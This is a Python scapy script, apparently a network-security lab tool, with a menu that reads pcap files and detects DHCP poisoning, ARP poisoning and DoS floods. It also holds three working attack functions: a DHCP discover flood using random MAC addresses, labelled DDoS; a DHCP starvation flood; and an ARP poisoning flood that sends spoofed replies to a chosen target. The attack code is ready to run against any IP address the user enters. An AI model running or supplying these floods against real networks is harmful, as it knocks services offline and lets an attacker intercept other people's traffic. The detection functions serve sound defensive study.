from scapy.all import rdpcap, RandMAC, sendp
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from collections import Counter, defaultdict
import socket
import struct
import fcntl
import time

def reader(pcap_file):
    try:
        packets = rdpcap(pcap_file)  # Read packets from the pcap file
        protocol_counts = {}  # Dictionary to count packets for each protocol

        # Initialize protocol counts
        protocols = ["Ethernet", "IP", "UDP", "BOOTP", "DHCP"]
        for protocol in protocols:
            protocol_counts[protocol] = 0

        # Count occurrences of each protocol
        for pkt in packets:
            if pkt.haslayer(Ether):
                protocol_counts["Ethernet"] += 1
            if pkt.haslayer(IP):
                protocol_counts["IP"] += 1
            if pkt.haslayer(UDP):
                protocol_counts["UDP"] += 1
            if pkt.haslayer(BOOTP):
                protocol_counts["BOOTP"] += 1
            if pkt.haslayer(DHCP):
                protocol_counts["DHCP"] += 1

        # Display results
        print(f"Total packets in {pcap_file}: {len(packets)}")
        print("Packet counts by protocol:")
        for protocol, count in protocol_counts.items():
            print(f"- {protocol}: {count}")

    except FileNotFoundError:
        print(f"Error: File {pcap_file} not found.")
    except Exception as e:
        print(f"An error occurred while reading the pcap file: {e}")

def detect_dhcp_poisoning(pcap_file):
    try:
        packets = rdpcap(pcap_file)  # Read packets from the pcap file
        dhcp_sources = []
        suspicious_packets = []

        # Extract source IPs from DHCP packets and save packet info
        for pkt in packets:
            if pkt.haslayer(DHCP):
                if pkt.haslayer(IP):
                    dhcp_sources.append(pkt[IP].src)
                    suspicious_packets.append(pkt.summary())

        # Count occurrences of each source IP
        source_counts = Counter(dhcp_sources)

        # Detect potential DHCP poisoning
        print("\nDHCP Poisoning Detection:")
        for source, count in source_counts.items():
            if count > 10:
                print(f"Warning: Potential DHCP poisoning detected! Source {source} appears {count} times.")
                print("Potential DHCP poisoning packets:")
                for pkt_info in suspicious_packets[:5]:  # Print up to 5 packets
                    print(f"  - {pkt_info}")

        if not any(count > 10 for count in source_counts.values()):
            print("No DHCP poisoning detected.")

    except FileNotFoundError:
        print(f"Error: File {pcap_file} not found.")
    except Exception as e:
        print(f"An error occurred while analyzing the pcap file: {e}")

def detect_arp_poisoning(pcap_file):
    try:
        packets = rdpcap(pcap_file)  # Read packets from the pcap file
        arp_replies = defaultdict(list)  # Track identical ARP reply messages and the packets

        # Populate the map with ARP reply packet details
        for pkt in packets:
            if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # ARP reply (op=2)
                message = f"{pkt[ARP].psrc} is at {pkt[ARP].hwsrc}"
                arp_replies[message].append(pkt)

        # Detect ARP reply messages that appear more than 5 times
        print("\nARP Poisoning Detection:")
        warning_issued = False
        for message, packets in arp_replies.items():
            if len(packets) > 5:
                warning_issued = True
                print(f"Warning: Potential ARP poisoning detected! Message '{message}' appears {len(packets)} times.")
                print("Potential ARP poisoning packets:")
                for pkt in packets[:5]:  # Print up to 5 packets
                    print(f"  - {pkt.summary()}")

        if not warning_issued:
            print("No ARP poisoning detected.")

    except FileNotFoundError:
        print(f"Error: File {pcap_file} not found.")
    except Exception as e:
        print(f"An error occurred while analyzing the pcap file: {e}")

def send_ddos_flood(target_ip, iface):
    try:
        start_time = time.time()
        print(f"[+] Starting DDoS flooding for 30 seconds targeting {target_ip}")
        ip_counter = 1  # Counter for incrementing IPs

        while time.time() - start_time < 30:
            # Incrementing source IPs within a private range
            src_ip = f"192.168.100.{ip_counter % 255}"
            dhcp_discover = (
                Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
                IP(src=src_ip, dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=RandMAC()) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            sendp(dhcp_discover, iface=iface, verbose=False)
            ip_counter += 1  # Increment the counter
        print("[+] DHCP flood complete.")
    except Exception as e:
        print(f"An error occurred during DHCP flooding: {e}")

def send_dhcp_flood(target_ip, iface):
    try:
        start_time = time.time()
        print(f"[+] Starting DHCP flooding for 30 seconds targeting {target_ip}")
        while time.time() - start_time < 30:
            dhcp_discover = (
                Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst=target_ip) /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=RandMAC()) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            sendp(dhcp_discover, iface=iface, verbose=False)
        print("[+] DHCP flood complete.")
    except Exception as e:
        print(f"An error occurred during DHCP flooding: {e}")

def send_arp_flood(target_ip, spoof_ip, target_mac, iface):
    try:
        start_time = time.time()
        print(f"[+] Starting ARP flooding for 30 seconds targeting {target_ip} with spoofed IP {spoof_ip}")
        while time.time() - start_time < 30:
            arp_poison_packet = (
                Ether(dst=target_mac) /
                ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
            )
            sendp(arp_poison_packet, iface=iface, verbose=False)
        print("[+] ARP flood complete.")
    except Exception as e:
        print(f"An error occurred during ARP flooding: {e}")

def detect_dos_attacks(pcap_file):
    try:
        packets = rdpcap(pcap_file)  # Read packets from the pcap file
        ip_counts = Counter()  # Count occurrences of source IPs

        for pkt in packets:
            if pkt.haslayer(IP):
                ip_counts[pkt[IP].src] += 1

        # Detect potential DoS attacks based on packet frequency
        print("\nDoS Attack Detection:")
        for ip, count in ip_counts.items():
            if count > 1000:  # Threshold for potential DoS attack
                print(f"Warning: Potential DoS attack detected! Source IP {ip} sent {count} packets.")

        if not any(count > 1000 for count in ip_counts.values()):
            print("No DoS attacks detected.")

    except FileNotFoundError:
        print(f"Error: File {pcap_file} not found.")
    except Exception as e:
        print(f"An error occurred while analyzing the pcap file: {e}")

if __name__ == "__main__":
    while True:
        print("\nSelect an option:")
        print("1. Reader (Count protocols)")
        print("2. Detect DHCP Poisoning")
        print("3. Detect ARP Poisoning")
        print("4. Detect DoS Attacks")
        print("5. Send DDoS (30 seconds)")
        print("6. Send DHCP Flood (30 seconds)")
        print("7. Send ARP Flood (30 seconds)")
        print("Type 'exit' to quit.")
        choice = input("Enter your choice: ").strip()

        if choice.lower() == 'exit':
            print("Exiting the program.")
            break

        if choice in ['1', '2', '3', '4']:
            pcap_file_path = input("Enter the path to the pcap file: ").strip()

            if choice == '1':
                reader(pcap_file_path)
            elif choice == '2':
                detect_dhcp_poisoning(pcap_file_path)
            elif choice == '3':
                detect_arp_poisoning(pcap_file_path)
            elif choice == '4':
                detect_dos_attacks(pcap_file_path)

        elif choice == '5':
            target_ip = input("Enter the target IP address: ").strip()
            iface = input("Enter the network interface: ").strip()
            send_ddos_flood(target_ip, iface)

        elif choice == "6":
            target_ip = input("Enter the target IP address: ").strip()
            iface = input("Enter the network interface: ").strip()
            send_dhcp_flood(target_ip, iface)

        elif choice == '7':
            target_ip = input("Enter the target IP address: ").strip()
            spoof_ip = input("Enter the spoofed IP address: ").strip()
            target_mac = input("Enter the target MAC address: ").strip()
            iface = input("Enter the network interface: ").strip()
            send_arp_flood(target_ip, spoof_ip, target_mac, iface)

        else:
            print("Invalid option. Please try again.")